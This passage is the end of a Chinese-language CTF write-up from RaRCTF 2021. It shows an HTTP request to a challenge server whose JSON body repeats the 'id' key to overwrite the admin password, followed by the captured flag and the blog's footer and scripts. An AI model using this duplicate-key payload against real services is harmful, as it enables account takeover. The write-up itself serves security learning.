+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/manager/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>maas.rars.win</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJtYW5hZ2VyaWQiOiIxIiwibWFuYWdlcm5hbWUiOiJMZW1vblByZWZlY3QifQ.YRPO1A.PH8WHzCXnxjEwlMIUQvkfzxyuGc</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:0,&quot;id&quot;:1,&quot;password&quot;:&quot;this_is_a_long_password&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此時使用修改的密碼再去登入 admin 賬戶即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;rfc8259_15_4_b1t_v4gu3_1a97a3d3&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fancy-Button-Generator"><span class="toc-number">1.1.</span> <span class="toc-text">Fancy Button Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lemonthinker"><span class="toc-number">1.2.</span> <span class="toc-text">lemonthinker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Uploader"><span class="toc-number">1.3.</span> <span class="toc-text">Secure Uploader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Microservices-As-A-Service-3"><span class="toc-number">1.4.</span> <span class="toc-text">Microservices As A Service 3</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/837b9c99.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&text=RaRCTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&is_video=false&description=RaRCTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RaRCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/837b9c99.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&name=RaRCTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&t=RaRCTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
